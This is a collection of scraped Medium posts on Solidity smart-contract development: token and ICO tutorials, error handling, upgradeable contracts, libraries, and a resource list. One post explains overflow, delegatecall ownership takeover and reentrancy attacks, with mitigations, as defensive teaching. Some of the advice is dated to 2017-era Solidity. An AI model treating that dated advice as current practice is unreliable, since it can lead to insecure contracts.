[{"title": "Build Your First Ethereum Smart Contract with Solidity\u200a\u2014\u00a0Tutorial", "author_name": "Pete Humiston", "link": "https://codeburst.io/build-your-first-ethereum-smart-contract-with-solidity-tutorial-94171d6b1c4b?source=search_post---------0", "post_date": "Nov 12, 2017", "readtime": "24 min read", "upvotes": "5.2K", "content": "Build Your First Ethereum Smart Contract with Solidity\u200a\u2014\u00a0TutorialPete HumistonBlockedUnblockFollowFollowingNov 12, 2017So you wanna build a smart contract? Perhaps you want to understand how they work, maybe you want to build your own Dapp, maybe you want to launch the very first billion dollar ICO (sarcasm)... Regardless of your intentions, learning how smart contracts work is invaluable. The Ethereum platform possesses enormous potential to create Dapps that could change the way we interact on the web in the decades to come. While Ethereum deploys smart contracts that work much like a standard blockchain transaction, they yield a conditional statement that must be met before a function(s) is executed. Smart contracts can be used for voting, crowdfunding, blind auctions, multi-signature wallets and MUCH more.", "responses": "67"}, {"title": "How To Create Token and Initial Coin Offering Contracts Using Truffle + Zeppelin\u00a0Solidity", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://blog.zeppelin.solutions/how-to-create-token-and-initial-coin-offering-contracts-using-truffle-openzeppelin-1b7a5dae99b6?source=search_post---------1", "post_date": "May 17, 2017", "readtime": "5 min read", "upvotes": "2.5K", "content": "How To Create Token and Initial Coin Offering Contracts Using Truffle + Zeppelin\u00a0SolidityGustavo (Gus) GuimaraesBlockedUnblockFollowFollowingMay 17, 2017Update: this blog post has been updated for OpenZeppelin Solidity version v2.0I have tested this blog post with the following dependencies:- node@10.11.0- truffle@v4.1.14- ganache-cli@v6.1.8- zeppelin-solidity@2.0.0Token contracts are hot. Token crowd sales aka Initial Coin Offers(ICO) are hotter. There have been a lot going in terms of ICOs lately in the crypto world and if you would like to code one yourself, look no further. In this blog post I am going to go through the steps to create your own and only token as well as the ICO contract for it. We will also use the help of some clever tools.Caveat: You should not actually release your ICO with the code found here. It is for demo purposes only. But it is a good start.For this tutorial I am going to be using Truffle and Zeppelin Solidity. Truffle is the de facto framework for creating smart contracts and decentralized applications. Zeppelin Solidity is a library that has extensive and well tested smart contracts that adhere to security best practices. In the smart contract world where a small bug can cost you money, it is good not to reinvent the wheel when there are trusted solutions out there.We will also use ganache-cli as the blockchain node because it is fast and developer friendly.Side note: If you want to actually create the contract on the Ethereum testnet or main net you would have to use something like Geth or Parity.Moving on: provided that you have npm and node installed, from terminal type the commands:$ npm install -g ganache-cli$ npm install -g truffle$ mkdir my-ico && cd my-ico$ truffle init$ npm install openzeppelin-solidity@2.0.0A lot of magic happened with those commands above. But in essence it is the setup that will get you up and running with creating and deploying your ICO smart contract.This adds the openzeppelin-solidity folder to node_modules and in it you will find all smart contract templates from the OpenZeppelin Solidity library.First step is to create the token contract.touch contracts/GustavoCoin.solAnd for the code:How simple is that?!That is a straightforward token contract. We practically let Zeppelin Solidity smart contract templates do all the heavy duty for us. Here we reference MintableToken\u00a0. The idea is to have a token where the supply is controlled by an owner who can emit tokens and assign them. For a better look at what this contract does, check it at node_modules/zeppelin-solidity/contracts/token/ERC20/MintableToken.sol\u00a0.The following step is to create the Crowdsale contract.touch contracts/GustavoCoinCrowdsale.solWe are basically going to inherit the contract at node_modules/zeppelin-solidity/contracts/crowdsale/emission/MintedCrowdsale.sol and node_modules/zeppelin-solidity/contracts/crowdsale/validation/TimedCrowdsale.sol. We end up with only the code below.Beautiful, huh? We are using the secure contracts provided by Zeppelin Solidity to our advantage. Note that GustavoCoinCrowdsale inherits from TimedCrowdsale and MintedCrowdsale. In order to deploy GustavoCoinCrowdsale\u00a0, we must give a few parameters to its constructor function as per the Crowdsale and TimeCrowdsale contracts, i.e. openingTime and closingTime timestamps, the rate of token per ether rate, the token address itself and the wallet address of the contract owner(s).Let\u2019s deploy this contract. Open a new terminal tab and run$ ganache-cliIt will run ganache-cli. We are using it for our development needs.First, let\u2019s add this to truffle.js file. It is for configuration purposes:truffle.js:module.exports = {    networks: {        development: {            host: \"localhost\",            port: 8545,            network_id: \"*\" // Match any network id        }    }};Then, go on (you may need to create it) to the file migrations/2_deploy_contracts.js and modify it to this:Note that we are not deploying GustavoCoin\u00a0. This is because once GustavoCoinCrowdsale deploys it will create GustavoCoin\u00a0. Now back to the terminal tab where you installed Truffle, run the commands:$ truffle compile$ truffle migrateIf you happen to look at the ganache-cli tab you will see that the contract was deployed successfully.Alright, let\u2019s buy some GUS tokens.Run $ truffle consoleThis will open truffle console and we are going to use the web3.js API to interact with the deployed contract.// The account that will buy GUS tokens. It will show differently in your ganache-cli console> purchaser = web3.eth.accounts[2]'0xddac5d057c79facd674bc95dfd9104076fd34d6b'// The address of the GUS token instance that was created when the crowdsale contract was deployed// assign the result of GustavoCoinCrowdsale.deployed() to the variable crowdsale> GustavoCoinCrowdsale.deployed().then(inst => { crowdsale = inst })undefined> crowdsale.token().then(addr => { tokenAddress = addr } )undefined> tokenAddress'0x87a784686ef69304ac0cb1fcb845e03c82f4ce16'> gustavoCoinInstance = GustavoCoin.at(tokenAddress)...// add minter role to crowdsale so it is able to mint tokens during crowdsale> gustavoCoinInstance.addMinter(crowdsale.address)...// now check the number of GUS tokens purchaser has. It should be 0> gustavoCoinInstance.balanceOf(purchaser).then(balance => balance.toString(10))'0'// Buying GUS tokens> GustavoCoinCrowdsale.deployed().then(inst => inst.sendTransaction({ from: purchaser, value: web3.toWei(5, \"ether\")})){ tx: '0x68aa48e1f0d0248835378caa1e5b2051be35a5ff1ded82878683e6072c0a0cfc',  receipt:   { transactionHash: '0x68aa48e1f0d0248835378caa1e5b2051be35a5ff1ded82878683e6072c0a0cfc',     transactionIndex: 0,     blockHash: '0xb48ceed99cf6ddd4f081a99474113c4c16ecf61f76625a6559f1686698ee7d57',     blockNumber: 5,     gasUsed: 68738,     cumulativeGasUsed: 68738,     contractAddress: null,     logs: [] },  logs: [] }undefined// Check the amount of GUS tokens for purchaser again. It should have some now.> gustavoCoinInstance.balanceOf(purchaser).then(balance => purchaserGusTokenBalance = balance.toString(10))'5000000000000000000000'// When we created our token we made it with 18 decimals, which the same as what ether has. That's a lot of zeros, let's display without the decimals:> web3.fromWei(purchaserGusTokenBalance, \"ether\")'5000'Yay! It worked.Where to go after here you ask?You could test this code on the Ethereum testnet, or you could create a web app that would allow users to interact with the CrowdsaleToken contract, you could add more functionality to the contract itself such as deadline, token cap, etc. Unleash your inner token creator.The Ethereum community grows by the day and though there are not many tools out there yet, the ones such as Truffle and Zeppelin Solidity do a great job at improving developer\u2019s experience.I am curious to know what you will be coding from here.By the way, here is the repo containing the code for this blog post.I want to leave my gratitude for Francisco Giordano for reviewing the code used in this blog post.", "responses": "74"}, {"title": "Solidity Learning: Revert(), Assert(), and Require() in Solidity, and the New REVERT Opcode in the\u00a0EVM", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/the-use-of-revert-assert-and-require-in-solidity-and-the-new-revert-opcode-in-the-evm-1a3a7990e06e?source=search_post---------2", "post_date": "Sep 27, 2017", "readtime": "6 min read", "upvotes": "2.5K", "content": "Solidity Learning: Revert(), Assert(), and Require() in Solidity, and the New REVERT Opcode in the\u00a0EVMUpcoming Changes to Solidity and How They\u00a0FunctionSteven McKieBlockedUnblockFollowFollowingSep 27, 2017Photo by Osman\u00a0RanaCrosspost: This post was originally written by \u201cMaurelian\u201d of ConsenSys and can be found here. This was posted with his permission, enjoy!The release of Solidity version 0.4.10 introduced the assert(), require()and revert() functions, and confusion has reigned ever since.In particular, the assert() and require() \u201cguard\u201d functions improve the readability of contract code, but differentiating between them can be quite confounding.In this article, I\u2019ll:explain the problem these functions solve.discuss how the Solidity compiler handles the new assert(), require()and revert().Give some rules of thumb for deciding how and when to use each one.For convenience, I\u2019ve created a simple contract using each of these features which you can test out in remix.If you really just want a TLDR, this answer on the ethereum stackexchangeshould do it.Patterns for error handling in\u00a0SolidityThe old way: throw and the if\u00a0\u2026 throw\u00a0patternSay your contract has a few special functions, that should only be callable by a particular address which is designated as the owner.Prior to Solidity 0.4.10 (and for a while afterwards), this was a common pattern for enforcing permissions:contract HasAnOwner {    address owner;        function useSuperPowers(){         if (msg.sender != owner) { throw; }        // do something only the owner should be allowed to do    }}If the useSuperPowers() function is called by anyone other than owner, the function will throw returning an invalid opcode error, undoing all state changes, and using up all remaining gas (see this article for more on gas and fees in ethereum).The throw keyword is now being deprecated, and eventually will be removed altogether. Fortunately, the new functions assert(), require(), and revert() provide the same functionality, with a much cleaner syntax.Life after\u00a0throwLet\u2019s look at how to update that if\u00a0.. throw pattern with our new guard functions.This line:if(msg.sender\u00a0!= owner) { throw; }currently behaves exactly the same as all of the following:if(msg.sender\u00a0!= owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner);Note that in the assert() and require() examples, the conditional statement is an inversion of the if block\u2019s condition, switching the comparison operator\u00a0!=to ==.Differentiating between assert() and require()First, to help separate these \u2018guard\u2019 functions in your mind, imagine assert()as an overly assertive bully, who steals all your gas. Then imagine require()as a polite managerial type, who calls out your errors, but is more forgiving.With that mnemonic handy, what\u2019s the real difference between these two functions?Prior to the Byzantium network upgrade, require() and assert() actually behave identically, but their bytecode output is slightly different.assert() uses the 0xfe opcode to cause an error conditionrequire() uses the 0xfd opcode to cause an error conditionIf you look up either of those opcodes in the yellow paper, you won\u2019t find them. This is why you see the invalid opcode error, because there\u2019s no specification for how a client should handle them.That will change however after Byzantium, and the implemention of EIP-140: REVERT instruction in the Ethereum Virtual Machine\u00a0. Then the0xfd opcode will be mapped to theREVERT instruction.This is what I find really fascinating:Many contracts have been deployed since version 0.4.10, which include a new opcode lying dormant, until it\u2019s no longer invalid. At the appointed time, it will wake up, and become REVERT!Note: throw andrevert() also use 0xfd. Prior to 0.4.10. throw used 0xfe.What the REVERT opcode will\u00a0doREVERT will still undo all state changes, but it will be handled differently than an \u201cinvalid opcode\u201d in two ways:It will allow you to return a value.It will refund any remaining gas to the caller.1. It will allow you to return a\u00a0valueMost smart contract developers are quite familiar with the notoriously unhelpful invalid opcode error. Fortunately, we\u2019ll soon be able to return an error message, or a number corresponding to an error type.That will look something like this:revert(\u2018Something bad happened\u2019);orrequire(condition, \u2018Something bad happened\u2019);Note: solidity doesn\u2019t support this return value argument yet, but you can watch this issue for that update.2. Refund the remaining gas to the\u00a0callerCurrently, when your contract throws it uses up any remaining gas. This can result in a very generous donation to miners, and often ends up costing users a lot of money.Once REVERT is implemented in the EVM, it will be plain old bad manners not to use it to refund the excess gas.Choosing between revert(), assert() and require()So, ifrevert() and require() both refund any left over gas, AND allow you to return a value, why would want to burn up gas using assert()?The difference lies in the bytecode output, and for this I\u2019ll quote from the docs(emphasis mine):The require function should be used to ensure valid conditions, such as inputs, or contract state variables are met, or to validate return values from calls to external contracts. If used properly, analysis tools can evaluate your contract to identify the conditions and function calls which will reach a failing assert. Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix.To clarify that somewhat: it should be considered a normal and healthy occurrence for a require() statement to fail (same with revert()). When an assert() statement fails, something very wrong and unexpected has happened, and you need to fix your code.By following this guidance, static analysis and formal verification tools will be able to examine your contracts to find and prove the conditions which could break your contract, or to prove that your contract operates as designed without flaws.In practice, I use a few heuristics to help me decide which is appropriate.Use require()to:Validate user inputs ie. require(input<20);Validate the response from an external contract ie. require(external.send(amount));Validate state conditions prior to execution, ie. require(block.number > SOME_BLOCK_NUMBER) or require(balance[msg.sender]>=amount)Generally, you should use require most oftenGenerally, it will be used towards the beginning of a functionThere are many examples of require() in use for such things in our Smart Contract Best Practices.Use revert()to:Handle the same type of situations as require(), but with more complex logic.If you have some complex nested if/else logic flow, you may find that it makes sense to use revert() instead of require(). Keep in mind though, complex logic is a code smell.Use assert() to:Check for overflow/underflow, ie. c = a+b; assert(c > b)Check invariants, ie. assert(this.balance >= totalSupply);Validate state after making changesPrevent conditions which should never, ever be possibleGenerally, you will probably use assert less oftenGenerally, it will be used towards the end of a function.Basically, require() should be your go to function for checking conditions, assert() is just there to prevent anything really bad from happening, but it shouldn\u2019t be possible for the condition to evaluate to false.Also: \u201cyou should not use assert blindly for overflow checking but only if you think that previous checks (either using ifor require) would make an overflow impossible\u201d.\u200a\u2014\u200acomment from @chrisethConclusionThese functions are very powerful tools for your security toolbox. Knowing how and when to use them will not only help prevent vulnerabilities, but also make your code more user friendly, and future proof against upcoming changes.Do you love this\u00a0stuff?I\u2019m part of the team at ConsenSys Diligence. If you have a knack for diving deeply into Solidity and the EVM, and an interest in smart contract security, we\u2019re looking for people to join our smart contract audit practice (apply here).If you made it this far in the post, but don\u2019t meet the exact criteria in the job description, that\u2019s OK. Just include a message mentioning this post, and calling out your experience with, and interest in Ethereum.", "responses": "14"}, {"title": "Writing upgradable contracts in\u00a0Solidity", "author_name": "Elena Dimitrova", "link": "https://medium.com/colony/writing-upgradeable-contracts-in-solidity-6743f0eecc88?source=search_post---------3", "post_date": "Jun 8, 2016", "readtime": "4 min read", "upvotes": "1.8K", "content": "Writing upgradable contracts in\u00a0SolidityElena DimitrovaBlockedUnblockFollowFollowingJun 8, 2016Ethereum contracts are immutable\u200a\u2014\u200aonce deployed to the blockchain they cannot be updated, yet the need to change their logic with time is ultimately necessary. This article presents one way to implement upgradeable Ethereum contracts.During a contract upgrade the following factors need to be considered:Block gas limit (4712388 for Homestead)Upgrade transactions tend to be large due to the amount of processing they have to complete e.g. deploy a contract, move data, move references.Inter-contract dependencies\u200a\u2014\u200awhen a contract is compiled, all of its imports are compiled into the contract thus leading to a ripple effect when you want to swap out a contract which is being referenced by other contracts.These two are related, as having more dependencies affects the size of your deployed contracts and the overall transaction size of the upgrade. The implementation patterns below work to minimise the upgrade gas costs as well as loosening the coupling of contracts without breaking Solidity type safety.Note that for the sake of simplifying the examples, we have omitted the implementation of security and permissions.Avoid large data copy operationsStoring data is expensive (SSTORE operation costs 5000 or 20000 gas, http://gavwood.com/Paper.pdf) and upgrading contracts containing large storage variables runs the chance of hitting the transaction gas limit during the copying of its data. You may therefore want to isolate your datastore from the rest of your code, and make it as flexible as possible, so that it is unlikely to need to be upgraded.Depending on your circumstances, how large of a datastore you need and whether you expect its structure to change often, you may choose a strict definition or a loosely typed flat store. Below is an example of the latter which implements support for storing a sha3 key and value pairs. It is the more flexible and extensible option. This ensures data schema changes can be implemented without requiring upgrades to the storage contract.For upgrades you can then just switch the upgraded contract to point to the new EternalStorage contract instance without having to copy any of its data.Use libraries to encapsulate logicLibraries are a special form of contracts that are singletons and not allowed any storage variables. http://solidity.readthedocs.io/en/latest/contracts.html#librariesThe advantage of libraries in the context of upgrades is that they allow encapsulation of business logic or data management logic (which more frequently change) into singleton instances that cost only upgrading one and not many contracts.Example below shows a library used for adding a Proposal to storage.Sample library used for adding Proposals to storrageUnder the cover, library functions are called using delegatecall from the calling contract which has the advantage of passing the msg.sender and msg.value seamlessly. You can therefore write your library code as if it were just part of your contract, without having to worry about the sender or value changing.The example below shows a sample Organisation contract using ProposalsLibrary to interact with data storage.Sample Organisation contract calling library functionsWith libraries, there is a slight gas overhead on each call. However, it makes deploying a new contract much cheaper. In the case of Organisation, deployment cost has dropped by 10%\u00a0:                            (before / after) library implementationcreating an Organisation :  1179032 / 1048206creating a Proposal      :    71964 /   72599Use \u2018interfaces\u2019 to decouple inter-contract communicationAbstract contract implementation behind an interface that only defines its function signatures.This is a well known pattern in object oriented programming so if you\u2019ve done any\u00a0.NET or Java you\u2019ll be at home with this concept of abstraction. This is best shown by an example, consider the following use of\u00a0:Organisation contract working with a TokenLedger interfaceHere instead of importing the entire TokenLedger.sol contract, we use an interface containing just the function signatures. This eases any possible upgrades to TokenLedger which don\u2019t affect its interface, too, which with this model can be implemented without redeploying the Organisation (calling) contract.SummaryThe guiding principle in this refactoring was the Ethereum white paper \u2018DAO\u2019 section https://github.com/ethereum/wiki/wiki/White-Paper#decentralized-autonomous-organizations, which writesAlthough code is theoretically immutable, one can easily get around this and have de-facto mutability by having chunks of the code in separate contracts, and having the address of which contracts to call stored in the modifiable storage.Implementing permanent storage, encapsulating logic in library functions and abstracting via an interface are all in line with this principle where we use address pointers in the calling Organisation contract for interacting with storage and business logic. Full code samples of Organisation and its Parent contract responsible for managing it can be found below.Organisation.solThe Parent contract is responsible for creating and upgrading Organisations.Parent.sol", "responses": "13"}, {"title": "How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part\u00a01)", "author_name": "Georgios Konstantopoulos", "link": "https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d?source=search_post---------4", "post_date": "Jan 8, 2018", "readtime": "5 min read", "upvotes": "1.9K", "content": "How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part\u00a01)Georgios KonstantopoulosBlockedUnblockFollowFollowingJan 8, 2018In a previous post we discussed the future of Ethereum\u2019s scalability by analyzing the concepts presented at Devcon3. Let\u2019s take a moment and imagine that all these scalability issues are now solved, and Ethereum\u2019s Smart Contracts are working without issues.Are those users going to be good willed or are they possible adversaries who interfere with the smooth functionality of the contracts?Smart contracts are \u201cimmutable\u201d. Once they are deployed, their code is impossible to change, making it impossible to fix any discovered bugs.In a potential future where whole organizations are governed by smart contract code, there is an immense need for proper security. Past hacks such as TheDAO or this year\u2019s Parity hacks (July, November) have raised developers\u2019 awareness, but we still have a long way to go.\u201cThis is Disneyland for\u00a0hackers\u201dIn this article we will go through some of the famous security pitfalls and their mitigations.1. Overflows & UnderflowsAn overflow is when a number gets incremented above its maximum value. Solidity can handle up to 256 bit numbers (up to 2\u00b2\u2075\u2076-1), so incrementing by 1 would result into 0.  0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF+ 0x000000000000000000000000000000000001----------------------------------------= 0x000000000000000000000000000000000000After reaching the maximum reading, an odometer or trip meter restarts from zero, called odometer rollover.[source]Likewise, in the inverse case, when the number is unsigned, decrementing will underflow the number, resulting in the maximum possible value.  0x000000000000000000000000000000000000- 0x000000000000000000000000000000000001----------------------------------------= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFYou can test the bug here:As dangerous as both cases are, the underflow case is the more likely to happen, for example in the case where a token holder has X tokens but attempts to spend X+1. If the code does not check for it, the attacker might end up being allowed to spend more tokens than he had and have a maxed out balance.Mitigation: It has been a standard for a while now to use OpenZeppelin\u2019s SafeMath library.You can test the fixed bug here:2. Visibility & delegatecallFor the people who were around in July, this bug will be familiar, after all it was the Parity wallet hack which cost users about 30 million dollars.Solidity visibility modifiers and their differences.Public functions can be called by anyone (by functions from inside the contract, by functions from inherited contracts or by outside users)External functions can only be accessed externally, which means they cannot be called by other functions of the contract. The gist below does not compile, the external visibility of cannotBeCalled does not allow it to be called by the contract\u2019s functions (however it can be called by another contract)External is cheaper to use because it uses the calldata opcode while public needs to copy all the arguments to memory, as described here.Private and internal are simpler: private means that the function can only be called from inside the contract, while internal proves a more relaxed restriction allowing contracts that inherit from the parent contract to use that function.That said, keep your functions private or internal unless there is a need for outside interaction.DelegatecallParaphrased from the solidity docs:\u201cDelegatecall is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.\u201dThis low-level function has been very useful as it\u2019s the backbone for implementing Libraries and modularizing code. However it opens up the doors to vulnerabilities as essentially your contract is allowing anyone to do whatever they want with their state.In the example below, an attacker can call contract Delegate\u2019s public function pwn and since the call is in the context of Delegation, they can claim ownership of the contract.The Parity hack involved a combination of both insecure visibility modifiers and misuse of delegate call with abritrary data. The vulnerable contract\u2019s function implemented delegatecall and a function from another contract that could modify ownership was left public. That allowed an attacker to craft the msg.data field to call the vulnerable function.As for what would be included in the msg.data field, that is the signature of the function that you want to call. Signature here means the first 8 bytes of the sha3 (alias for keccak256)hash of the function prototype.In this case:web3.sha3(\"pwn()\").slice(0, 10) --> 0xdd365b8bIf the function takes an argument, pwn(uint256 x):web3.sha3(\"pwn(uint256)\").slice(0,10) --> 0x35f4581b3. Reentrancy (TheDAO\u00a0hack)Solidity\u2019s call function when called with value forwards all the gas it received. In the snippet below, the call is made before actually reducing the sender\u2019s balance. This opened up a vulnerability which is described very well in reddit comment when TheDAO hack happened:\u201cIn simple words, it\u2019s like the bank teller doesn\u2019t change your balance until she has given you all the money you requested. \u201cCan I withdraw $500? Wait, before that, can I withdraw $500?\u201dAnd so on. The smart contracts as designed only check you have $500 at the beinning, once, and allow themselves to be interrupted.\u201dAs described in detail here, the fix is to reduce the sender\u2019s balance before making the transfer of value. For people who have worked with parallel programming, another solution is using mutexes, mitigating all kinds of race conditions altogether.Currently, using msg.sender.transfer(_value) is the best practice. If you really need to use send userequire(msg.sender.send(_value));(Thank you Hayden Adams and Paulius for the fix on the above statement!)", "responses": "7"}, {"title": "Solidity CRUD- Part\u00a01", "author_name": "Rob Hitchens", "link": "https://medium.com/robhitchens/solidity-crud-part-1-824ffa69509a?source=search_post---------5", "post_date": "Feb 19, 2017", "readtime": "13 min read", "upvotes": "2.4K", "content": "Solidity CRUD- Part\u00a01Rob HitchensBlockedUnblockFollowFollowingFeb 19, 2017Data Storage With Sequential Access, Random Access and DeleteUpdate 2019: The pattern described here is available as a Library now: https://medium.com/@robhitchens/solidity-crud-epilogue-e563e794fdeCode and PDF docs available at https://bitbucket.org/rhitchens2/soliditycrud", "responses": "21"}, {"title": "Solidity Smart Contracts Programming", "author_name": "K SYSTEMS LTD", "link": "https://medium.com/@ksystemsio/solidity-smart-contracts-programming-6d43b739102?source=search_post---------6", "post_date": "Aug 24, 2018", "readtime": "2 min read", "upvotes": "5.2K", "content": "Solidity Smart Contracts ProgrammingK SYSTEMS LTDBlockedUnblockFollowFollowingAug 24, 2018We set up and deploy your Solidity Smart Contracts within a few hours from your order, and you get to populate a planet with your project details in our Galaxy, the most advanced showroom available for startups today! The price? Only 12000 KSYS Tokens all inclusive!How did we achieve that?We used the Token Market Smart Contracts and our skills to develop an Open Zeppelin secured, state of the art, Solidity Coding Wizard. It helps up speeding up the coding and debugging of your Smart Contracts. We give you the source code so that you can easily verify it and publish it on Etherscan, but we do not stop here\u2026 You also get:Solidity programming languageOne Planet in the K Galaxy, the finest showroom in the Crypto Universe.A subdomain @ ksystems.io, our Corporate Domain. That means an amazing visibility in our constantly growing Community.FREE 12/7 dedicated customer support service. You can have a 24/7 customer support service for as little as 7000 KSYS Tokens a month.You will find all the required info about this service in our KSYS Shop.The KSYS Shop will open officially during Q4, 2018.Stay tuned, join our official Telegram Channel or Telegram Group for the latest updates!", "responses": "4"}, {"title": "Learn Solidity\u200a\u2014\u200aThe Ethereum smart contract programming language", "author_name": "Robbert Vermeulen", "link": "https://medium.com/@robbertvermeulen/learn-solidity-the-ethereum-smart-contract-programming-language-7f106fc26d6?source=search_post---------7", "post_date": "Jan 12, 2018", "readtime": "2 min read", "upvotes": "2K", "content": "Learn Solidity\u200a\u2014\u200aThe Ethereum smart contract programming languageRobbert VermeulenBlockedUnblockFollowFollowingJan 12, 2018In the course of time that I am involved in Ethereum development, I have noticed that not much information exists yet to learn Solidity (outside of the Solidity documentation).I have saved the information that I found in the meantime and the goal of this article is to share all my gathered resources, so other people new in this world don\u2019t have to search, but can start learning Solidity immediately.1. Solidity video tutorialsCoursesSolidity by What\u2019s SolidityDeveloping Ethereum Smart Contracts for Beginners by DesignCourseUltimate Introduction to Ethereum \u00d0app Development by Decypher mediaBuilding Ethereum dapp using Solidity by Shlomi zeltsingerEthereum Smart Contracts In Solidity by What the Func?Solidity and smart contracts tutorial for beginners by Vlad WulfICO developmentHow to build an ICO crowdsale with Open Zeppelin by Roman StormIt\u2019s too easy to launch ICO by shlomi zeltsingerDapp developmentHOWTO: Building Ethereum Apps With Truffle by Tim CoulterTutorial dapp with Solidity, Truffle, Web3 and Javascript by Blockchain Talks2. Solidity tutorialsBasicsA 101 Noob Intro to Programming Smart Contracts on EthereumLearn Solidity in Y minutesLearning Solidity by ExampleFull stack Hello world voting Ethereum Dapp tutorialBuild Your First Smart ContractMonax smart contract tutorialHow To Learn Solidity: The Ultimate Ethereum Coding GuideInteractiveCryptoZombiesSpace DoggosBitDegree Basic of SoliditySpecialtiesTyping and Your Contracts StorageDeploying A Smart Contract, The Hard WayRevert(), Assert() and Require()Constant vs View vs PureDapp developmentThe ultimate end-to-end tutorial to create and deploy a fully decentralized Dapp in Ethereum3. Smart contract\u00a0examplesEtherdice (Ethereum-based dice game)Zeppelin Solidity (ICO and token smart contracts)Ethereum Slot machine Dapp (Ethereum-based slot machine)Etherpot (lottery)The DAO framework\u200a\u2014\u200aDecentralized Autonomous Organization4. Solidity communitiesEthereum Developers Facebook groupSolidity RedditEthereum StackexchangeSolidity GitterEthereum Gitter (solidity channel)5. Solidity tools & frameworksZeppelin Solidity (development framework)Truffle (development framework)Remix Solidity IDE (Integrated development environment)Web3.js (Ethereum Javascript API)Solium (Analyzes your code for style & security issues)Javascript TestRPC (local blockchain development)MetaMask (browser extension)Geth (command line interface to run a full Ethereum node)Solc (Solidity compiler)6. Solidity\u00a0booksSolidity Programming Essentials: A beginner\u2019s guide to build smart contracts for Ethereum and blockchainIntroducing Ethereum and Solidity: Foundations of Cryptocurrency and Blockchain Programming for BeginnersEthereum Smart Contract Development: Build blockchain-based decentralized applications using Solidity", "responses": "9"}, {"title": "Library Driven Development in\u00a0Solidity", "author_name": "Jorge Izquierdo", "link": "https://medium.com/aragondec/library-driven-development-in-solidity-2bebcaf88736?source=search_post---------8", "post_date": "Feb 13, 2017", "readtime": "8 min read", "upvotes": "1.2K", "content": "Library Driven Development in\u00a0SolidityA comprehensive review on how to develop more modular, reusable and elegant smart contract systems on top of the Ethereum Virtual Machine by using librariesJorge IzquierdoBlockedUnblockFollowFollowingFeb 13, 2017Solidity is a limited\u00a0languageComing to Ethereum mainly from the lands of Swift and Javascript, developing in Solidity is definitely a step back in terms of what the language allows the programmer to do and the expressiveness of the language.Solidity, and in general languages that compile to bytecode intended to be executed in the EVM, are limited because:When executed, your code will run on every node of the network. Once a node receives a new block, it will verify its integrity. In Ethereum this also means verifying that all the computations that happened on that block were performed correctly and the new state of contracts is correct.This causes that, even though the EVM is Turing-complete, heavy computations are expensive (or directly not allowed by the current gas limit) because every node will need to perform it, therefore slowing the network.A standard library hasn\u2019t really been developed yet. Arrays and strings are specially painful, I have personally had to implement my own ASCII encoding and decoding and an algorithm to lowercase strings by hand, which are tasks I never had to even think about in other languages/platforms.You cannot get data from the outside world (out of the EVM) unless it gets in via a transaction (Oracle) and once a contract is deployed it is not upgradable (you can plan for migrations or pure storage contracts, though).Some of this limitations are needed for the existence of the Ethereum computing platform (you will never be able to store a backup of your Google Photos and perform image recognition purely on-chain, and that is just fine). Other limitations are here just because it is a really young technology (though evolving blazingly fast) and it will keep improving over time.That being said, it is very possible to build interesting projects on top of Ethereum today. I have personally recently discovered the use of libraries as a way to keep code clean and organized.What is a\u00a0libraryIn Solidity, a library is a different type of contract, that doesn\u2019t have any storage and cannot hold ether. Sometimes it is helpful to think of a library as a singleton in the EVM, a piece of code that can be called from any contract without the need to deploy it again.This has the obvious benefit of saving substantial amounts of gas (and therefore not contaminating the blockchain with repetitive code), because the same code doesn\u2019t have to be deployed over and over, and different contracts can just rely on the same already deployed library.The fact that multiple contracts depend on the exact piece of code, can make for a more secure environment. Imagine not only having well audited code for common endeavors (like the tremendous job the guys at Zeppelin are doing), but relying on the same deployed library code that other contracts are already using. It would certainly have helped in this case, where all balances of an ERC20 token (nothing too fancy), that was intended to raise a maximum of $50M, were whipped out.Disclaimer: Everything below was written for Solidity v0.4.8, given the current rate at which it is evolving, it might be outdated soon.Enough buzz words, what is a\u00a0libraryA library is a type of contract that doesn\u2019t allow payable functions and cannot have a fallback function (this limitations are enforced at compile time, therefore making it impossible for a library to hold funds). A library is defined with the keyword library (library C {}) in the same way a contract is defined (contract A {}).Calling a function of a library will use a special instruction (DELEGATECALL), that will cause the calling context to be passed to the library, as if it was code running in the contract itself. I really like this angle from the Solidity documentation, \u201cLibraries can be seen as implicit base contracts of the contracts that use them\u201d.In this snippet, when function a() of contract A is called, the address of the contract will be returned and not the library\u2019s. This appears to be the same for all msg properties msg.sender, msg.value, msg.sig, msg.data and msg.gas. (Solidity documentation related to this indicates otherwise, but after doing some testing it looks like msg context is maintained)How libraries are\u00a0linkedDifferent from explicit base contract inheritance (contract A is B {}) a contract that depends on a library is not that clear how it gets linked with it. In the above case, contract A uses library C in its function a(), but there is no mention of what address of the library to use, and C won\u2019t get compiled inside A\u2019s bytecode.Library linking happens at the bytecode level. When contract A is compiled, it leaves a placeholder for the library address in this way 0073__C_____________________________________630dbe671f(0dbe671f is the function signature for a()). If we were to deploy contract A untouched, the deployment would fail as the bytecode is invalid.Library linking is as simple as replacing all occurrences of the library placeholder in the contract bytecode with the address of the deployed library in the blockchain. Once the contract is linked to the library, it can be deployed.How libraries are\u00a0upgradedOriginal (Feb 2017): They are not, in the same way contracts aren\u2019t either. As stated in the previous section, the reference to the library is made at the bytecode level rather than at the storage level. Changing the bytecode of a contract is not allowed once deployed, therefore the reference to the library will live as long as the contract does.UPDATE (March 2017): We have been working on the library upgradeability problem for the last weeks since the publication of this article on a way to upgrade libraries. We have been working with our friends at Zeppelin and have published an article about it:Proxy Libraries in SolidityThis is a joint post by Zeppelin and Aragon.medium.comWith this new method instead on linking a contract against a library address, it can be linked with the dispatcher and that will allow for updating the underlying library later own, and upgrade the business logic of the contract.\u2018Using\u2019 structs and\u00a0methodsEven though libraries do not have storage, they can modify their linked contract\u2019s storage. When passed astorage reference as an argument to a library call, any modifications the library does, will be saved in the contract\u2019s own storage. It is helpful to think of it as to passing a C pointer 